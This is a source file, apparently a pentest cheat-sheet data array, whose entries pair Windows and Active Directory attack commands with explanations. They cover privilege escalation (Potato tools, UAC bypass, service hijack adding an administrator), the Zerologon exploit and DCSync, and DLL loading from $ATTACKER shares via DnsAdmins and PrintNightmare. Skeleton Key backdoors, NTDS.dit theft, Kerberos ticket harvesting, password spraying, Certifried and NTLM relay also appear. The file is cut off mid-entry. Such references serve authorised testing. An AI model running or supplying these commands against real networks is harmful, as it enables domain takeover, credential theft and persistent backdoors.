    tool: "Windows PrivEsc: GodPotato",
    phase: "privesc",
    title: "SYSTEM via SeImpersonatePrivilege (modern OS)",
    command: "GodPotato.exe -cmd \"cmd /c whoami\"",
    description: "Modern Potato-family SeImpersonatePrivilege abuse, working across Windows Server 2012 through 2022.",
    useCase: "Use when PrintSpoofer fails — e.g. because the spooler service is disabled or removed.",
  },
  {
    id: "remotepotato0-listener",
    tool: "RemotePotato0",
    phase: "privesc",
    title: "Start the relay listener for a Cross-Session Activation",
    command: "sudo ntlmrelayx.py -t ldap://$DC --escalate-user $USER --no-http-server --no-wcf-server -smb2support",
    description: "RemotePotato0 doesn't need SeImpersonatePrivilege at all — it coerces a DCOM authentication from a different, more privileged logon session on the same box (an active RDP/console admin session) and relays it. Start the relay first, since the coercion below sends auth to it immediately.",
    useCase: "Local privesc on a host where the current account has no impersonation privilege, but a privileged user is also logged on (e.g. an admin's RDP session left open).",
  },
  {
    id: "remotepotato0-trigger",
    tool: "RemotePotato0",
    phase: "privesc",
    title: "Trigger the Cross-Session Activation",
    command: "RemotePotato0.exe -m 1 -s 1",
    description: "Forces the target logon session (-s, session ID from `query user`/`qwinsta`) to activate a DCOM object that authenticates back to the attacker — that authentication gets relayed by the listener above instead of completing normally.",
    useCase: "Escalating from a low-privilege service/RDP session to whatever the coerced session's identity can reach (often Domain Admin, if that's who's logged on).",
  },
  {
    id: "uacme-akagi",
    tool: "UACME",
    phase: "privesc",
    title: "Bypass UAC to run elevated without a prompt",
    command: "Akagi64.exe 23 C:\\Temp\\payload.exe",
    description: "UACME collects dozens of known UAC-bypass methods (auto-elevating binaries, DLL hijacking of trusted auto-elevate processes, COM handler hijacking) behind one launcher — the numeric argument selects which specific method to use, since Microsoft patches individual methods over time.",
    useCase: "Running a payload with the full-admin token a local-admin-group member already has, but that UAC is otherwise filtering out of their default token — no exploit needed, just abusing auto-elevation trust.",
  },
  {
    id: "winpriv-unquoted-path",
    tool: "Windows PrivEsc recon",
    phase: "privesc",
    title: "Find unquoted service paths",
    command: "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\"'",
    description: "Finds services whose executable path contains spaces and isn't wrapped in quotes, letting Windows try each space-separated segment as a possible executable.",
    useCase: "Classic privesc — plant a malicious exe at one of the ambiguous path segments and restart the service.",
  },
  {
    id: "winpriv-accesschk",
    tool: "Windows PrivEsc: AccessChk",
    phase: "privesc",
    title: "Find services you can reconfigure",
    command: "accesschk.exe -uwcqv $USER *",
    description: "Sysinternals tool that finds services the current user can reconfigure (start type, binary path) even without admin rights.",
    useCase: "Locating a writable/misconfigured service to hijack via sc config.",
  },
  {
    id: "winpriv-sc-config",
    tool: "Windows PrivEsc: sc",
    phase: "privesc",
    title: "Hijack a misconfigured service",
    command: "sc config VULNSVC binpath= \"cmd /c net localgroup administrators $USER /add\" && sc start VULNSVC",
    description: "Reconfigures a service you have write access to, pointing it at a malicious command, then starts it so it executes as the service's (often SYSTEM) account.",
    useCase: "Follow-up once AccessChk shows a service you can reconfigure.",
  },
  {
    id: "winpriv-alwaysinstallelevated",
    tool: "Windows PrivEsc recon",
    phase: "privesc",
    title: "Check for AlwaysInstallElevated",
    command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    description: "If both HKLM and HKCU have this set to 1, any user can install an MSI package with SYSTEM privileges.",
    useCase: "Quick registry check before crafting a malicious MSI payload with a tool like msfvenom.",
  },
  {
    id: "winpriv-schtasks",
    tool: "Windows PrivEsc recon",
    phase: "privesc",
    title: "List scheduled tasks and their run-as account",
    command: "schtasks /query /fo LIST /v",
    description: "Shows every scheduled task and the account it runs as — a task running as SYSTEM with a writable target binary/script is a direct privesc path.",
    useCase: "Finding a SYSTEM-run scheduled task that executes a file the current user can overwrite.",
  },
  {
    id: "winpriv-cmdkey",
    tool: "Windows PrivEsc recon",
    phase: "privesc",
    title: "List saved credentials",
    command: "cmdkey /list",
    description: "Lists saved credentials in Windows Credential Manager, including for RDP or network shares that other users may have saved.",
    useCase: "Discovering stored credentials that can be replayed via runas /savecred.",
  },
  {
    id: "winpriv-runas-savecred",
    tool: "Windows PrivEsc: runas",
    phase: "privesc",
    title: "Reuse a saved credential",
    command: "runas /savecred /user:$DOMAIN\\administrator cmd.exe",
    description: "Reuses a previously saved credential (via /savecred) to run a command as another user without needing to know or re-enter the password.",
    useCase: "Follow-up once cmdkey /list shows a saved privileged credential is available.",
  },
  {
    id: "winpeas",
    tool: "Windows PrivEsc: WinPEAS",
    phase: "privesc",
    title: "Automated Windows privesc enumeration",
    command: "winPEASx64.exe",
    description: "Automated enumeration script covering services, registry, scheduled tasks, tokens, AutoRuns, stored credentials and more in one run.",
    useCase: "Fast triage pass on a new Windows foothold before diving into any single technique manually.",
  },
  {
    id: "powerup-allchecks",
    tool: "Windows PrivEsc: PowerUp",
    phase: "privesc",
    title: "PowerShell privesc enumeration",
    command: "Invoke-AllChecks",
    description: "PowerShell equivalent of WinPEAS, focused on the classic service/registry/AlwaysInstallElevated-style privesc checks (from PowerUp.ps1).",
    useCase: "Windows-native alternative to WinPEAS when getting PowerShell execution is easier than dropping an exe.",
  },

  // ============ TOP-TIER / SECOND-TIER GAP FILL ============

  // --- Zerologon (CVE-2020-1472) ---
  {
    id: "zerologon-test",
    tool: "Zerologon (CVE-2020-1472)",
    phase: "privesc",
    title: "Check if a DC is vulnerable",
    command: "python3 zerologon_tester.py $TARGETOBJECT $DC",
    description: "Sends a harmless probe using the Netlogon authentication flaw to confirm whether the DC is unpatched, without changing anything.",
    useCase: "Always test before exploiting — this attack touches the DC's own machine account password.",
  },
  {
    id: "zerologon-exploit",
    tool: "Zerologon (CVE-2020-1472)",
    phase: "privesc",
    title: "Reset the DC's machine account password to empty",
    command: "python3 cve-2020-1472-exploit.py $TARGETOBJECT $DC",
    description: "Exploits a flaw in the Netlogon secure channel's AES-CFB8 IV handling to reset the DC's own computer account password to an empty string — no credentials needed.",
    useCase: "Instant path to a DC's own hash, and from there the whole domain, on any unpatched DC (patched since August 2020).",
  },
  {
    id: "zerologon-dump",
    tool: "Impacket (secretsdump.py)",
    phase: "cred",
    title: "Dump the domain using the emptied DC password",
    command: "secretsdump.py -just-dc -no-pass $DOMAIN/'$TARGETOBJECT$'@$DC",
    description: "Authenticates as the DC's own (now-empty-password) machine account to DCSync the entire domain.",
    useCase: "The actual payoff step right after a successful Zerologon exploit.",
  },
  {
    id: "zerologon-relay-dcsync",
    tool: "Impacket (ntlmrelayx.py)",
    phase: "cred",
    title: "Non-disruptive Zerologon: relay straight to a DCSync",
    command: "ntlmrelayx.py -t dcsync://$TARGETOBJECT -smb2support",
    description: "Dirk-jan Mollema's alternative to the classic password-change exploit — instead of touching the DC's own machine password at all, it relays a coerced authentication straight into operating a DCSync, so there's nothing to restore afterward and zero impact on domain replication.",
    useCase: "Getting the same full-domain DCSync payoff as Zerologon without any of the disruption risk of the password-reset technique.",
  },
  {
    id: "coercer-zerologon-relay",
    tool: "Coercer",
    phase: "cred",
    title: "Coerce a DC's authentication into the Zerologon relay",
    command: "coercer coerce -t $DC -l $ATTACKER -u $USER -p $PASS -d $DOMAIN",
    description: "Triggers any RPC coercion primitive (MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP) against the target DC so it authenticates to the attacker, feeding the waiting ntlmrelayx dcsync:// relay from the entry above.",
    useCase: "The coercion half of the non-disruptive Zerologon relay chain — works against any DC, or any other account with sufficient privileges to be worth relaying.",
  },
  {
    id: "zerologon-restore",
    tool: "Zerologon (CVE-2020-1472)",
    phase: "evasion",
    title: "Restore the DC's original machine password",
    command: "# Reference only: run the exploit repo's restorepassword.py using the DC's original NT hash captured before the reset — leaving it empty breaks the DC's own domain trust relationship.",
    description: "Zerologon leaves the DC in a broken state (empty password) until this is reversed — an unrestored DC can eventually stop replicating or authenticating properly.",
    useCase: "Critical operational-safety step — never skip this on a real engagement, the DC's password must be restored to its pre-exploit hash.",
  },

  // --- DnsAdmins group abuse ---
  {
    id: "dnsadmins-dll",
    tool: "DnsAdmins abuse",
    phase: "privesc",
    title: "Load an arbitrary DLL as SYSTEM via the DNS service",
    command: "dnscmd $DC /config /serverlevelplugindll \\\\$ATTACKER\\share\\evil.dll\nsc.exe \\\\$DC stop dns\nsc.exe \\\\$DC start dns",
    description: "DnsAdmins members can point the DNS Server service at an arbitrary plugin DLL via a documented (mis)feature — the DLL loads with the service's own privileges the next time it starts.",
    useCase: "The DNS service almost always runs on the DC itself with SYSTEM privileges, so DnsAdmins membership is a direct-to-SYSTEM-on-a-DC path.",
  },

  // --- PrivExchange ---
  {
    id: "privexchange",
    tool: "PrivExchange",
    phase: "privesc",
    title: "Coerce Exchange auth and relay it to LDAP",
    command: "python3 privexchange.py -ah $ATTACKER $TARGET -u $USER -d $DOMAIN -p $PASS\nsudo ntlmrelayx.py -t ldap://$DC --escalate-user $USER",
    description: "Exchange servers hold WriteDacl on the domain object by default (a long-standing Exchange install artifact). Coercing the Exchange server's machine account to authenticate via its own push-notification feature and relaying that to LDAP grants the attacker DCSync rights.",
    useCase: "Turns any mailbox-having low-privilege user into full domain compromise, purely from an Exchange server being present.",
  },

  // --- Skeleton Key ---
  {
    id: "mimikatz-skeleton",
    tool: "Mimikatz",
    phase: "persist",
    title: "Skeleton Key — universal master password",
    command: "privilege::debug\nmisc::skeleton",
    description: "Patches LSASS in memory on a DC so it accepts a fixed master password (mimikatz) for every domain account, without changing or disabling anyone's real password.",
    useCase: "Extremely stealthy persistence — legitimate logons continue working normally, so the backdoor is invisible unless someone actually tries the master password.",
  },

  // --- Golden gMSA ---
  {
    id: "goldengmsa-kdsinfo",
    tool: "GoldenGMSA",
    phase: "cred",
    title: "Dump KDS root keys",
    command: "GoldenGMSA.exe kdsinfo",
    description: "Retrieves the KDS root key(s) that Active Directory uses to derive every gMSA's password domain-wide.",
    useCase: "First step toward computing any gMSA's current — and future — password entirely offline.",
  },
  {
    id: "goldengmsa-compute",
    tool: "GoldenGMSA",
    phase: "cred",
    title: "Compute a gMSA's password from the KDS root key",
    command: "GoldenGMSA.exe compute --sid $SID --kdskey <KDSKeyGUID-from-kdsinfo> --pwdid <ManagedPasswordID-of-target-gMSA>",
    description: "Derives the exact same password AD itself would compute for a target gMSA, using the stolen KDS root key — no read access to msDS-ManagedPassword needed at all.",
    useCase: "Compromises every current and future gMSA in the domain from a single KDS root key theft — a much bigger blast radius than a single ReadGMSAPassword edge.",
  },

  // --- SeBackupPrivilege abuse ---
  {
    id: "sebackup-diskshadow",
    tool: "SeBackupPrivilege abuse",
    phase: "cred",
    title: "Create a shadow copy to bypass file locks/ACLs",
    command: "diskshadow /s diskshadow_script.txt",
    description: "diskshadow_script.txt (set context persistent nowriters / add volume c: alias cdrive / create / expose %cdrive% e:) creates a Volume Shadow Copy, exposing a read-only snapshot of the whole C: drive — including files normally locked or access-restricted, like NTDS.dit.",
    useCase: "First step for extracting NTDS.dit from a live DC using only SeBackupPrivilege, no admin rights needed.",
  },
  {
    id: "sebackup-robocopy",
    tool: "SeBackupPrivilege abuse",
    phase: "cred",
    title: "Copy NTDS.dit out via the backup privilege",
    command: "robocopy /b e:\\windows\\ntds\\ ntds_backup ntds.dit\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM",
    description: "robocopy's /b flag uses the backup API, which SeBackupPrivilege authorizes regardless of the file's actual ACL — pulling NTDS.dit off the shadow copy exposed in the previous step.",
    useCase: "Combined with reg save SYSTEM, gives everything secretsdump.py needs to extract every domain hash completely offline.",
  },

  // --- WSUS abuse ---
  {
    id: "wsuspect",
    tool: "WSUSpect / pywsus",
    phase: "lateral",
    title: "Serve a malicious update via a hijacked WSUS session",
    command: "python3 pywsus.py --host $ATTACKER --port 8530 --sconfig sconfig.json",
    description: "If WSUS traffic isn't using HTTPS (the default in many environments), an attacker positioned to intercept it can serve a malicious 'update' that the client installs and runs as SYSTEM.",
    useCase: "Requires a MITM position (ARP/DNS spoofing) to redirect a target's WSUS traffic to this listener first — but can compromise many machines fleet-wide from one vantage point.",
  },

  // --- SCCM / MECM abuse ---
  {
    id: "sccm-naa-creds",
    tool: "SharpSCCM",
    phase: "cred",
    title: "Extract the Network Access Account credential",
    command: "SharpSCCM.exe local naa",
    description: "Reads the Network Access Account credential cached in local WMI/policy on any machine managed by SCCM/MECM — used by the client to reach content on the network.",
    useCase: "The NAA frequently has far more domain access than the workstation it's cached on, making this a common local-to-domain pivot.",
  },
  {
    id: "sccm-pxe-creds",
    tool: "SharpSCCM",
    phase: "cred",
    title: "Extract credentials from PXE boot media",
    command: "SharpSCCM.exe get pxe -f media.pxe -p 'MediaPassword'",
    description: "Decrypts a captured PXE boot media file, which often contains the same Network Access Account credential or task sequence secrets in cleartext once decrypted.",
    useCase: "Alternative path to NAA/task-sequence credentials when you can capture PXE boot traffic but don't have a managed endpoint to query directly.",
  },

  // --- Diamond ticket ---
  {
    id: "diamond-ticket",
    tool: "Rubeus",
    phase: "persist",
    title: "Diamond ticket — stealthier golden ticket",
    command: "Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512 /krbkey:$HASH /ptt",
    description: "Instead of forging a TGT entirely from scratch like a golden ticket, this requests a real TGT from the KDC first and then modifies specific fields in memory — so the ticket's other metadata looks legitimately KDC-issued.",
    useCase: "Evades detection logic that flags golden tickets by their offline-forged structure/timestamps, since a diamond ticket started life as a real one.",
  },
  {
    id: "rubeus-tgtdeleg",
    tool: "Rubeus",
    phase: "cred",
    title: "Get a usable TGT with zero elevated rights",
    command: "Rubeus.exe tgtdeleg /nowrap",
    description: "Abuses the Kerberos TGT delegation trick (requesting a service ticket to yourself with the forwardable flag, which the GSS-API silently upgrades into a usable TGT) — works from an unprivileged, unelevated context, no admin rights or LSASS access needed.",
    useCase: "Recovering a fully usable TGT for the current user when you can't touch LSASS at all — a common situation on hardened/EDR-monitored hosts.",
  },
  {
    id: "rubeus-triage",
    tool: "Rubeus",
    phase: "cred",
    title: "List every cached ticket on the host",
    command: "Rubeus.exe triage",
    description: "Enumerates every Kerberos ticket cached across every logon session on the box — with elevation, this includes other users' sessions, not just the current one.",
    useCase: "Finding out whether a privileged user's ticket is sitting in memory on a shared or jump-box host before deciding whether a full dump is worth it.",
  },
  {
    id: "rubeus-dump",
    tool: "Rubeus",
    phase: "cred",
    title: "Extract cached TGTs from LSA",
    command: "Rubeus.exe dump /nowrap",
    description: "Dumps the actual TGT data (not just metadata) from LSA for every accessible logon session, ready to pass-the-ticket with elsewhere.",
    useCase: "Harvesting other logged-on users' TGTs on a host with SeDebugPrivilege — a lighter-weight alternative to a full Mimikatz sekurlsa pass when all you need are Kerberos tickets.",
  },
  {
    id: "rubeus-harvest",
    tool: "Rubeus",
    phase: "cred",
    title: "Continuously harvest TGTs as users log on",
    command: "Rubeus.exe harvest /interval:30",
    description: "Polls every 30 seconds and automatically dumps any new TGTs that appear — catches privileged logons that happen after you've started watching, not just what's already cached.",
    useCase: "Sitting on a frequently-used jump box or shared server and collecting tickets from whoever logs in over time, without needing to already know when that will happen.",
  },
  {
    id: "rubeus-createnetonly",
    tool: "Rubeus",
    phase: "evasion",
    title: "Spawn a sacrificial logon session for ticket injection",
    command: "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /show",
    description: "Creates a new logon session with bogus credentials (a 'sacrificial' process) that a ticket can be injected into afterward — keeps injected tickets isolated from your actual current session.",
    useCase: "Avoiding contaminating your primary session's ticket cache when testing multiple forged/stolen tickets, and reducing the chance a ticket op affects unrelated running processes.",
  },
  {
    id: "rubeus-brute",
    tool: "Rubeus",
    phase: "cred",
    title: "Password spray via Kerberos pre-authentication",
    command: "Rubeus.exe brute /password:Summer2026! /noticket",
    description: "Sprays a single password against every user in the domain using Kerberos pre-auth responses to validate hits — Rubeus's built-in equivalent to Kerbrute's spray mode, no separate tool needed if Rubeus is already staged.",
    useCase: "Password spraying without leaving PowerShell/Rubeus for a separate tool, and without generating the 4625 failed-logon events an SMB-based spray would.",
  },
  {
    id: "rubeus-hash",
    tool: "Rubeus",
    phase: "cred",
    title: "Compute Kerberos keys from a plaintext password",
    command: "Rubeus.exe hash /password:$PASS /user:$USER /domain:$DOMAIN",
    description: "Derives the RC4 (NTLM), AES128, and AES256 Kerberos keys that would result from a given password — useful for confirming what key material a cracked password actually produces.",
    useCase: "Verifying a cracked kerberoast/AS-REP password against the key material you already captured, or preparing the right key format for a ticket-forging command.",
  },
  {
    id: "rubeus-describe",
    tool: "Rubeus",
    phase: "cred",
    title: "Decode a base64 Kerberos ticket",
    command: "Rubeus.exe describe /ticket:$OUTFILE",
    description: "Parses and prints the readable contents of a base64-encoded or .kirbi ticket file — user, target service, flags, encryption type, and validity window.",
    useCase: "Inspecting a ticket obtained from another tool or another operator before deciding how to use it, without guessing at what it actually grants.",
  },
  {
    id: "rubeus-purge",
    tool: "Rubeus",
    phase: "evasion",
    title: "Clear all cached Kerberos tickets",
    command: "Rubeus.exe purge",
    description: "Wipes every Kerberos ticket cached in the current logon session — including any injected/forged tickets planted during testing.",
    useCase: "Cleanup step after testing pass-the-ticket or forged-ticket techniques, so nothing forged is left sitting in memory once you're done with that session.",
  },

  // --- Certifried (CVE-2022-26923) ---
  {
    id: "certifried-setup",
    tool: "Certifried (CVE-2022-26923)",
    phase: "privesc",
    title: "Create a computer account and rename it to a DC's hostname",
    command: "addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Passw0rd!' $DOMAIN/$USER:$PASS\ncertipy account update -u $USER@$DOMAIN -p $PASS -user 'FAKE01$' -dns $DC",
    description: "Any user can create a computer account via MachineAccountQuota, and — until patched — could also rewrite its dNSHostName attribute to match an existing DC's hostname, something that was assumed to be validated but wasn't.",
    useCase: "Sets up an identity collision: a low-privilege-created machine account that AD CS will treat as if it were the actual domain controller.",
  },
  {
    id: "certifried-cert",
    tool: "Certifried (CVE-2022-26923)",
    phase: "cred",
    title: "Request a certificate as the spoofed DC identity",
    command: "certipy req -u 'FAKE01$'@$DOMAIN -p 'Passw0rd!' -ca 'CA-NAME' -template Machine -dns $DC",
    description: "Requests a certificate using the default Machine template — since the computer's dNSHostName now matches the real DC, the issued certificate authenticates as that DC.",
    useCase: "Complete domain compromise from a standard, unprivileged domain user account (patched by Microsoft in May 2022 — check patch status first).",
  },
  {
    id: "certifried-detect-patch",
    tool: "Certipy",
    phase: "recon",
    title: "Check whether a target is patched against Certifried",
    command: "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'User'",
    description: "If the resulting certificate embeds a SID (Certipy prints \"Certificate object SID is [...]\"), the CA is patched — the szOID_NTDS_CA_SECURITY_EXT extension only appears post-patch. No SID printed means the attack can proceed; note both the CA and the KDC need patching for full protection.",
    useCase: "A quick, low-noise patch-level check before spending effort setting up the full attack chain.",
  },
  {
    id: "bloodyad-certifried-manual",
    tool: "bloodyAD",
    phase: "privesc",
    title: "Certifried: clear SPNs and rewrite dNSHostName manually",
    command: "bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC set object $TARGETOBJECT serviceprincipalname\nbloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC set object $TARGETOBJECT dnsHostName -v '$DC.$DOMAIN'",
    description: "The raw two-step mechanism certipy's `account update -dns` performs automatically: clearing the computer's existing SPNs first (so the constraint-violation check has nothing to compare against), then overwriting dNSHostName to the target DC's hostname — otherwise the DC rejects the rename outright.",
    useCase: "Understanding or replicating the exact Certifried mechanism from bloodyAD when Certipy's higher-level `account update` isn't available or desired.",
  },

  // --- ShadowCoerce ---
  {
    id: "shadowcoerce",
    tool: "ShadowCoerce",
    phase: "privesc",
    title: "Coerce authentication via the File Server VSS Agent",
    command: "python3 ShadowCoerce.py -u $USER -p $PASS -d $DOMAIN $ATTACKER $DC",
    description: "Forces a target to authenticate via MS-FSRVP (the File Server Remote VSS Protocol) — another coercion primitive alongside PetitPotam, PrinterBug, and DFSCoerce.",
    useCase: "Fallback coercion option worth trying when the other three are patched or unavailable on a target.",
  },

  // ============ BLOODHOUND CYPHER QUERY LIBRARY ============

  {
    id: "cypher-shortest-owned-to-da",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Shortest path from owned principals to Domain Admins",
    command: "MATCH (n {owned:true}), (m:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}), p=shortestPath((n)-[*1..]->(m)) RETURN p",
    description: "Marking compromised accounts as 'owned' in BloodHound, then running this, shows the shortest escalation path from what you've already got to Domain Admins specifically.",
    useCase: "The single most useful query once you've compromised your first account — mark it owned, run this.",
  },
  {
    id: "cypher-shortest-any-user-to-tier0",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Shortest path from any domain user to a Tier Zero asset",
    command: "MATCH (g:Group {name:'DOMAIN USERS@CORP.LOCAL'}), (t {highvalue:true}), p=shortestPath((g)-[*1..]->(t)) RETURN p",
    description: "Instead of starting from a specific compromised account, this shows the shortest path any ordinary domain user could take to reach a marked high-value target.",
    useCase: "Illustrating environment-wide risk during a report — this is the path a phished helpdesk user could realistically walk.",
  },
  {
    id: "cypher-kerberoastable",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find all Kerberoastable users",
    command: "MATCH (u:User {hasspn:true}) RETURN u",
    description: "Lists every user account with an SPN set — the same target set Rubeus/GetUserSPNs.py would enumerate, but cross-referenceable against the rest of the graph.",
    useCase: "Quick target list without leaving BloodHound, especially useful combined with the next query.",
  },
  {
    id: "cypher-kerberoastable-privileged",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Kerberoastable users who are also privileged",
    command: "MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group {highvalue:true}) RETURN u,g",
    description: "Narrows the full kerberoastable list down to only the ones that are members (directly or nested) of a high-value group.",
    useCase: "Prioritizing which SPN accounts to crack first — cracking a random service account's password is far less valuable than cracking one sitting in Domain Admins.",
  },
  {
    id: "cypher-asreproastable",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find all AS-REP roastable users",
    command: "MATCH (u:User {dontreqpreauth:true}) RETURN u",
    description: "Lists every account with Kerberos pre-authentication disabled — the same target set GetNPUsers.py would find.",
    useCase: "Cross-referencing AS-REP roast targets against group membership and delegation the same way as kerberoastable accounts.",
  },
  {
    id: "cypher-unconstrained-delegation",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find computers with unconstrained delegation",
    command: "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c",
    description: "Lists every computer trusted for unconstrained delegation — any of these caches the TGT of whoever connects to it.",
    useCase: "Deciding where to sit and wait for a privileged account to authenticate, per the Rubeus monitor technique.",
  },
  {
    id: "cypher-constrained-delegation",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find accounts trusted for constrained delegation",
    command: "MATCH p=(u)-[:AllowedToDelegate]->(c:Computer) RETURN p",
    description: "Shows every AllowedToDelegate relationship in the domain — which accounts can impersonate users toward which specific services.",
    useCase: "Mapping out the constrained delegation abuse surface before running Rubeus s4u against a specific target.",
  },
  {
    id: "cypher-rbcd-configured",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find computers with RBCD already configured",
    command: "MATCH p=(c1:Computer)-[:AllowedToAct]->(c2:Computer) RETURN p",
    description: "Shows existing Resource-Based Constrained Delegation relationships between computer accounts — sometimes legitimate, sometimes a sign of prior compromise.",
    useCase: "Auditing for RBCD that shouldn't be there, or finding one you can already ride if you control the source computer account.",
  },
  {
    id: "cypher-da-members-nested",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "List all Domain Admins, including nested membership",
    command: "MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}) RETURN u",
    description: "Resolves nested group membership fully, unlike a plain 'net group' query which only shows direct members.",
    useCase: "Getting the real, complete list of who's actually a Domain Admin — nesting hides members surprisingly often.",
  },
  {
    id: "cypher-sessions-on-tier0",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find users with sessions on Tier Zero computers",
    command: "MATCH (u:User)-[:HasSession]->(c:Computer {highvalue:true}) RETURN u,c",
    description: "Shows which users currently have (or recently had, per SharpHound's collection) an active logon session on a marked high-value computer.",
    useCase: "If you also hold AdminTo on that same computer, this tells you exactly whose credentials are worth dumping there.",
  },
  {
    id: "cypher-admin-to-specific-user",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find every computer a specific user administers",
    command: "MATCH p=(u:User {name:'$TARGETOBJECT'})-[:AdminTo]->(c:Computer) RETURN p",
    description: "Shows the full blast radius of a single compromised account's local admin rights across the domain.",
    useCase: "Deciding where to pivot next once you've compromised one specific user.",
  },
  {
    id: "cypher-disabled-privileged",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find disabled accounts still in privileged groups",
    command: "MATCH (u:User {enabled:false})-[:MemberOf*1..]->(g:Group {highvalue:true}) RETURN u,g",
    description: "Disabled accounts are often assumed harmless, but group membership isn't automatically cleaned up when an account is disabled — and some 'disabled' service accounts get re-enabled for maintenance windows.",
    useCase: "A commonly-overlooked finding for a report — stale privileged accounts nobody remembered to clean up.",
  },
  {
    id: "cypher-no-laps",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find computers without LAPS enabled",
    command: "MATCH (c:Computer) WHERE NOT c.haslaps RETURN c",
    description: "Computers without LAPS typically share the same local administrator password across many machines — compromise one, and that password often works everywhere.",
    useCase: "Identifying which segment of the estate is exposed to a single-password local-admin-reuse chain.",
  },
  {
    id: "cypher-gpo-affecting-tier0",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find GPOs that apply to Tier Zero assets",
    command: "MATCH p=(gpo:GPO)-[:GPLink]->(container)-[:Contains*1..]->(t {highvalue:true}) RETURN p",
    description: "Shows which Group Policy Objects are linked to OUs containing high-value computers or users.",
    useCase: "Any GPO on this list is itself a Tier Zero asset — write access to it is as dangerous as write access to the DC.",
  },
  {
    id: "cypher-cross-domain-membership",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find cross-domain group membership",
    command: "MATCH p=(n1)-[:MemberOf]->(n2) WHERE NOT n1.domain = n2.domain RETURN p",
    description: "Surfaces principals from one domain holding group membership in another — a common and easily-overlooked trust abuse surface in multi-domain forests.",
    useCase: "Finding unexpected cross-domain privilege before diving into a specific trust-abuse technique.",
  },
  {
    id: "cypher-shortest-path-two-nodes",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Shortest path between two specific named objects",
    command: "MATCH (a {name:'$USER'}), (b {name:'$TARGETOBJECT'}), p=shortestPath((a)-[*1..]->(b)) RETURN p",
    description: "General-purpose version of the shortest-path queries above — swap in any two object names (users, groups, or computers) to see how they connect.",
    useCase: "Answering a specific 'can account A reach account B' question that the canned queries don't cover.",
  },
  {
    id: "cypher-adcs-esc-paths",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "Find paths through ADCS ESC edges",
    command: "MATCH p=(n)-[r:ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6|ADCSESC7|ADCSESC8]->(m) RETURN p",
    description: "Once the ADCS collector has run, this surfaces every certificate-based escalation edge in the graph in one query, instead of checking each ESC manually with Certipy.",
    useCase: "Fast triage of ADCS exposure directly from existing BloodHound data, no separate Certipy enumeration pass needed.",
  },
  {
    id: "cypher-list-owned",
    tool: "BloodHound (Cypher)",
    phase: "recon",
    title: "List every node currently marked as owned",
    command: "MATCH (n {owned:true}) RETURN n",
    description: "Quick sanity check of everything you've marked compromised so far in the current BloodHound database.",
    useCase: "Keeping track of engagement progress, or confirming the graph reflects reality before running an owned-starting-point query.",
  },


  // ============ PRINTNIGHTMARE / NTLM RELAY EXPANSION / GPO ============

  // --- PrintNightmare RCE (CVE-2021-34527) ---
  {
    id: "printnightmare-rce",
    tool: "PrintNightmare (CVE-2021-34527)",
    phase: "lateral",
    title: "Remote code execution via a malicious printer driver",
    command: "python3 CVE-2021-1675.py '$DOMAIN/$USER:$PASS'@$TARGET '\\\\$ATTACKER\\share\\evil.dll'",
    description: "Distinct from the SpoolSample coercion primitive — this abuses the print spooler's RpcAddPrinterDriver RPC call to install an attacker-supplied driver DLL, which the spooler service loads and executes as SYSTEM.",
    useCase: "Direct remote SYSTEM code execution on any host with the spooler exposed and unpatched, using only a low-privileged domain account's SMB write access to a share.",
  },
  {
    id: "printnightmare-local",
    tool: "PrintNightmare (CVE-2021-34527)",
    phase: "privesc",
    title: "Local privilege escalation variant",
    command: "python3 CVE-2021-1675.py '$DOMAIN/$USER:$PASS'@127.0.0.1 'C:\\Temp\\evil.dll'",
    description: "The same underlying spooler flaw, exploited locally rather than remotely, to escalate from a standard local user to SYSTEM on the box you're already on.",
    useCase: "Local privesc on an unpatched host where you already have a low-privilege foothold but no admin rights yet.",
  },

  // --- NTLM relay to non-SMB/LDAP protocols ---
  {
    id: "ntlmrelayx-http",
    tool: "Impacket (ntlmrelayx.py)",
    phase: "cred",
    title: "Relay NTLM auth to an HTTP target",
    command: "sudo ntlmrelayx.py -t http://$TARGET/some/admin/endpoint -smb2support",
    description: "Relays captured/coerced NTLM authentication to an HTTP endpoint instead of SMB/LDAP — useful against internal web admin panels, Exchange EWS/OWA, or any HTTP service that accepts Windows Integrated Auth.",
    useCase: "Turning a captured NTLM handshake into authenticated access to a web application, not just file-share or directory access.",
  },
  {
    id: "ntlmrelayx-imap",
    tool: "Impacket (ntlmrelayx.py)",
    phase: "cred",
    title: "Relay NTLM auth to IMAP (mailbox access)",
